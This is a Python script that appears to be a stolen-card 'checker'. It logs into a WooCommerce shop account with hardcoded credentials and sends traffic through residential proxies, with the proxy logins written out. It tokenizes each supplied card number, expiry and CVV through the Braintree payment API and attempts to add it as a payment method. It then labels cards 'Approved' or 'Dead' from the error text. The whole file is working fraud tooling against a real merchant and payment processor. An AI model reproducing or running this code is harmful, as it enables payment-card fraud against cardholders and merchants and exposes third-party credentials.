import base64
import requests
import random
import json
import names
from random_address import real_random_address
from bs4 import BeautifulSoup
import uuid




direc = real_random_address()

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session


def find_between(data, first, last):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None  

zipcode = direc['postalCode']
try:
    city = direc['city']
except KeyError:
    city = 'NY'
state = direc['state']
street = direc['address1']

class b3:
    def __init__(self, tarjeta):
        partes = tarjeta.split("|")
        
        self.tarjeta = tarjeta
        if len(partes) == 4:
            self.cc = partes[0]
            self.mes = partes[1]
            self.ano = partes[2]
            self.cvv = partes[3]
        self.username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
        self.CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
        self.Password = f"{names.get_first_name()}{names.get_last_name()}#{random.randint(1000000,9999999)}"
        
        
        
    def detectar_tipo_tarjeta(self):
        if self.cc.startswith("4"):
            return "Visa"
        elif self.cc.startswith("5"):
            return "MasterCard"
        elif self.cc.startswith("3"):
            return "American Express"
        elif self.cc.startswith("6"):
            return "Discover"
        else:
            return "Desconocido"
        
        
        
    def main(self):

        
        try:
            
            proxies = {'http': 'http://zeta2004l9vvwghjneqg:7ynYNmjlTkmrPiltSOcf@residential.rushproxy.io:1111','https': 'http://zeta2004l9vvwghjneqg:7ynYNmjlTkmrPiltSOcf@residential.rushproxy.io:1111'}
        
            session = requests.Session()
            session.proxies.update({'http://': 'jmqm9spstv88://ropatjem:jmqm9spstv88@185.242.93.188:8528', 'https://': 'jmqm9spstv88://ropatjem:jmqm9spstv88@185.242.93.188:8528'})
            
            SessionId = generar_codigo_session()
        
        
            headers = {'authority': 'www.americanairlessonline.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','referer': 'https://www.americanairlessonline.com/my-account/payment-methods/','sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',}
            response = session.get('https://www.americanairlessonline.com/my-account/', headers=headers).text
            login = find_between(response, 'name="woocommerce-login-nonce" value="', '"')
            
            headers = {'authority': 'www.americanairlessonline.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.americanairlessonline.com','referer': 'https://www.americanairlessonline.com/my-account/','sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',}
            data = {'username': 'ivarmamaninina@gmail.com','password': 'oseias1234M!','login': 'Log in','woocommerce-login-nonce': login,'_wp_http_referer': '/my-account/',}
            response = session.post('https://www.americanairlessonline.com/my-account/', headers=headers, data=data)
            
            headers = {'authority': 'www.americanairlessonline.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9','referer': 'https://www.americanairlessonline.com/my-account/payment-methods/','sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',}
            response = session.get('https://www.americanairlessonline.com/my-account/add-payment-method/',
            headers=headers,).text
            
            nonce = find_between(response, 'name="woocommerce-add-payment-method-nonce" value="', '"')
            nonce2 = find_between(response, '"client_token_nonce":"', '"')
            
            headers = {'authority': 'www.americanairlessonline.com','accept': '*/*','accept-language': 'en-US,en;q=0.9','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.americanairlessonline.com','referer': 'https://www.americanairlessonline.com/my-account/add-payment-method/','sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0','x-requested-with': 'XMLHttpRequest',}
            data = {'action': 'wc_braintree_credit_card_get_client_token','nonce': nonce2,}

            response = session.post('https://www.americanairlessonline.com/wp-admin/admin-ajax.php',headers=headers,data=data).text
            clienttoken = find_between(response, '"data":"', '"')
            bearer = json.loads(base64.b64decode(clienttoken))
            bearer = bearer['authorizationFingerprint']
            
            
            headers = {'authority': 'payments.braintree-api.com','accept': '*/*','accept-language': 'en-US,en;q=0.9','authorization': f'Bearer {bearer}','braintree-version': '2018-05-10','content-type': 'application/json','origin': 'https://assets.braintreegateway.com','referer': 'https://assets.braintreegateway.com/','sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',}
            json_data = {'clientSdkMetadata': {'source': 'client','integration': 'custom','sessionId': SessionId,},'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }','variables': {'input': {'creditCard': {'number': self.cc,'expirationMonth': self.mes,'expirationYear': self.ano,'cvv': self.cvv,},'options': {'validate': False,},},},'operationName': 'TokenizeCreditCard',}
            response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()
            tokencc = response['data']['tokenizeCreditCard']['token']
            
            headers = {'authority': 'www.americanairlessonline.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.americanairlessonline.com','referer': 'https://www.americanairlessonline.com/my-account/add-payment-method/','sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',}
            data = {'payment_method': 'braintree_credit_card','wc-braintree-credit-card-card-type': self.cc.startswith,'wc-braintree-credit-card-3d-secure-enabled': '','wc-braintree-credit-card-3d-secure-verified': '','wc-braintree-credit-card-3d-secure-order-total': '0.00','wc_braintree_credit_card_payment_nonce': tokencc,'wc_braintree_device_data': '{"correlation_id":"065adf55fa783fc51b87bf6bfddd5b06"}','wc-braintree-credit-card-tokenize-payment-method': 'true','woocommerce-add-payment-method-nonce': nonce,'_wp_http_referer': '/my-account/add-payment-method/','woocommerce_add_payment_method': '1',}
            response = session.post('https://www.americanairlessonline.com/my-account/add-payment-method/',headers=headers,data=data,).text
            
            session.close()

            code = find_between(response, '<ul class="woocommerce-error-text">', '</li>')
            code = code.strip().replace("<li>", "")
            
            result = str(code)
            #print(result)
            
            if 'Nice! New payment method added' in result:return 'Approved! ✅', 'Approved ✅'
            elif 'Invalid postal code and cvv' in result:return 'Approved! ✅', f'{result}' 
            elif 'Invalid postal code or street address' in result:return 'Approved! ✅', f'{result}' 
            elif 'avs_and_cvv' in result:return 'Approved! ✅', f'{result}' 
            elif 'Insufficient Funds' in result:return 'Approved! ✅', f'{result}' 
            elif 'Card Issuer Declined CVV' in result:return 'Approved! ✅', f'{result}' 
            else: return 'Dead! ❌', f'{result}', 
        except: return 'Dead! ❌', f'proxys zzzz', 
       